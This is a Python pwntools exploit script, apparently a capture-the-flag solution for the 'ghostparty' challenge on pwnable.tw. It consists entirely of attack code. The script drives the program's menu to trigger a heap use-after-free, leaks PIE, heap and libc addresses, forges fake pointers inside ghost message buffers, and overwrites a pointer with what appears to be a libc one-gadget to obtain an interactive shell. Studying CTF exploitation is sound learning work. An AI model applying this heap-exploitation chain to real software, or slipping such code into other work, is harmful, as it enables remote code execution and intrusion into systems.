from pwn import *

elf = ELF('./ghostparty')
#s = remote('192.168.0.85',1234)
s = remote('chall.pwnable.tw', 10401)
'''
-----------------
1.Werewolf      
2.Devil         
3.Zombie        
4.Skull         
5.Mummy         
6.Dullahan      
7.Vampire       
8.Yuki-onna     
9.Kasa-obake    
10.Alan         
-----------------
'''
def ghost_init(name,age,msg,gtype):
  s.recvuntil('Your choice :')
  s.send('1\n')
  s.recvuntil('Name :')
  s.send(name)
  s.recvuntil('Age :')
  s.send(str(age)+'\n')
  s.recvuntil('Message :')
  s.send(msg)
  s.recvuntil('type of ghost :')
  s.send(str(gtype)+'\n')
def rmghost(index):
  s.recvuntil('Your choice :')
  s.send('4\n')
  s.recvuntil(':')
  s.send(str(index)+'\n')
def victim(name,msg):
  ghost_init(name+'\n',1234,msg+'\n',1)
  s.recvuntil('?')
  s.send('0\n')
  s.recvuntil('Your choice :')
  s.send('1\n')
def trigger():
  ghost_init('1234'+'\n',1234,'1234\n',7)
  s.recvuntil(':')
  s.send('A'*0x59+'\n')
  s.recvuntil('Your choice :')
  s.send('3\n')
# step1
trigger()
victim('1234','1234')
victim('1234','A'*0x59)
rmghost(2)
s.recvuntil('Your choice :')
s.send('2\n')
s.recvuntil('party :')
s.send('0\n')
pie = u64(s.recvuntil('GHOST PARTY')[0x46:0x46+6]+'\x00\x00') - 0x210b98
log.info('PIE : 0x%x'%pie)
rmghost(0)
dat = p64(0xdeadbeef) + '\x00'*8 + p64(pie+0x0211030) + p64(0)*2 
dat += '\x41'*(0x59-len(dat)) 
ghost_init('1234\n',1234,dat+'\n',9)
for i in range(3):
  s.recvuntil(':')
  s.send('1234\n')
s.recvuntil('Your choice :')
s.send('1\n')
s.recvuntil('Your choice :')
s.send('2\n')
heap = u64(s.recvuntil('1.')[-3-6:-3]+'\x00\x00')
log.info("HEAP : 0x%x"%heap)
s.recvuntil('party :')
s.send('-1\n')
#step2
trigger()
victim('1234','1234')
victim('1234','A'*0x59)
rmghost(4)
rmghost(2)
dat = p64(0xdeadbeef) + '\x00'*8 + p64(pie+0x210E90) + p64(0)*2 
dat += '\x41'*(0x59-len(dat)) 
ghost_init('1234\n',1234,dat+'\n',9)
for i in range(3):
  s.recvuntil(':')
  s.send('1234\n')
s.recvuntil('Your choice :')
s.send('1\n')
s.recvuntil('Your choice :')
s.send('2\n')
libc = u64(s.recvuntil('3.')[0x29:0x29+6]+'\x00\x00') - 0x20740
log.info('LIBC : 0x%x'%libc)
s.recvuntil('party :')
s.send('-1\n')
#step3
trigger()
victim('1234','1234')
victim('1234','A'*0x59)
rmghost(6)
rmghost(4)
#heap + 0x480 -0x18
#system -- 0x45390
dat = p64(heap+0x480-0x18) + '\x00'*8 + p64(pie+0x210E90) + p64(0)*2 
dat += p64(libc + 0x0EF6C4)
dat += 'K'*(0x59-len(dat)) 
ghost_init('1234\n',1234,dat+'\n',9)
for i in range(3):
  s.recvuntil(':')
  s.send('1234\n')
s.recvuntil('Your choice :')
s.send('1\n')
s.interactive()
